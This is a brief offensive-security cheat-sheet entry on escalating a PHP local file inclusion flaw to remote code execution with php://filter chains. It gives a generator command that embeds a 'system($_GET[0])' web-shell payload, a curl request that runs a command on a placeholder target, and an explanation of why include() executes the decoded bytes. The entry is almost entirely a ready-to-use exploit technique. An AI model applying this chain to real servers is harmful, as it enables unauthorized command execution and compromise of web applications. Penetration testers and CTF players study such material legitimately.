# Code Execution

PHP filter-chain LFI → RCE — when an LFI only lets you read files (no upload), the `php://filter` chain can mutate an included stream into executable PHP without ever writing to disk:

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]);?>'
# -> prints a long php://filter/convert.iconv...convert.base64-decode/resource=<anything> chain
curl 'http://<target>/index.php?page=<url-encoded-chain>&0=id'
```
Works because `include()` on a `php://filter` wrapper runs the final decoded bytes as PHP source — the target file just needs to exist to anchor the include, its contents don't matter.
